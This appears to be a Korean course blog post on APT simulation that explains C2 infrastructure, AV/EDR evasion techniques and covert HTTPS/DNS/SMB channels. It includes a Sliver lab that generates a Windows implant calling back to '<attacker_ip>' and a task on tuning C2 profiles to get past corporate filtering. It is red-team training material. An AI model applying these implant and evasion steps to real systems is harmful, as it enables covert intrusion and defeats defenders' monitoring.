---
layout: post
title: "Offensive AD & APT Mastery: Week 10 - APT Simulation (C2 Infrastructure & Evasion)"
---

지금까지는 개별 기술(Techique)을 배웠습니다.
이제는 이 기술들을 엮어서 **작전(Operation)**을 수행해야 합니다.

해커는 노트북 들고 서버실에 들어가지 않습니다.
지구 반대편에서 **C2(Command & Control)** 서버를 통해 명령을 내립니다.

---

## 1. C2 Infrastructure

### C2 Frameworks
*   **Cobalt Strike:** 유료지만 업계 표준. 강력한 Beacon 기능.
*   **Sliver:** Go 언어 기반의 오픈소스 C2. (우리는 이걸 씁니다)
*   **Empire:** PowerShell 기반.

### Architecture
*   **Team Server:** 해커들이 접속하는 본부.
*   **Redirector:** 본부의 IP를 숨기기 위한 프록시. (AWS, Cloudflare 등 사용)
*   **Agent (Implant/Beacon):** 감염된 PC에서 실행되어 C2와 통신하는 악성코드.

---

## 2. Evasion Techniques (AV/EDR 우회)

그냥 `exe` 파일을 만들면 백신이 바로 잡습니다.

*   **Obfuscation:** 코드 난독화.
*   **Packing:** 압축해서 시그니처 숨기기.
*   **Loading:**
    *   **DLL Sideloading:** 정상 프로그램이 악성 DLL을 로드하게 만듦.
    *   **Reflective DLL Injection:** 디스크에 파일 안 쓰고 메모리에서 바로 실행.
*   **Living off the Land (LotL):** `certutil`, `bitsadmin` 같은 기본 도구 사용.

---

## 3. Communication Channels

C2 트래픽을 숨겨야 합니다.
*   **HTTPS:** 일반 웹 서핑처럼 위장. (Malleable C2 Profile 사용)
*   **DNS:** DNS 쿼리에 데이터를 숨김. (느리지만 방화벽 우회에 강력)
*   **SMB:** 내부망에서 감염된 PC들끼리 통신할 때 사용. (P2P)

---

## 🛠️ Lab: Setting up Sliver C2

1.  **Install:** Kali에 Sliver를 설치합니다.
2.  **Generate:** `generate --mtls <attacker_ip> --os windows` 명령어로 임플란트(exe)를 생성합니다.
3.  **Listener:** `mtls` 리스너를 켭니다.
4.  **Execute:** 윈도우 클라이언트에서 백신을 끄고(실습이니까) 실행합니다.
5.  **Control:** Kali에서 세션이 맺어지면 `shell`, `ps`, `ls` 명령을 내려봅니다.

---

## 📝 10주차 과제: C2 Profile Analysis

**목표:** Cobalt Strike의 Malleable C2 Profile을 분석하여 트래픽 위장 원리를 이해하세요.

1.  GitHub에서 `jquery-c2.profile` 같은 예제를 찾으세요.
2.  `http-get` 섹션에서 `uri`와 `header`가 어떻게 설정되어 있는지 확인하세요.
    *   예: jQuery 라이브러리를 다운로드하는 척 위장.
3.  만약 기업 보안팀이 "User-Agent가 비어있는 HTTP 요청"을 차단한다면, C2 프로필을 어떻게 수정해야 할까요?

---

## ✅ Self-Assessment Quiz

1.  **Q1.** 감염된 호스트에서 실행되어 공격자의 C2 서버와 주기적으로 통신하며 명령을 받아오는 악성코드를 무엇이라 부르나요? (Agent / Implant / Beacon)
2.  **Q2.** C2 서버의 실제 IP를 숨기기 위해 앞단에 배치하는 프록시 서버나 서비스를 무엇이라 하나요? (Redirector)
3.  **Q3.** 악성코드가 디스크에 파일을 생성하지 않고 메모리 상에서만 실행되도록 하는 기법은? (Fileless Malware / Reflective DLL Injection)

---

다음 주, 우리는 공격자의 입장에서 벗어나 **방어자(Blue Team)**의 시각을 갖습니다.
SIEM(Splunk)과 Sysmon을 이용해 우리가 지금까지 저지른 짓들을 탐지해 봅니다.

**Hide in plain sight.**
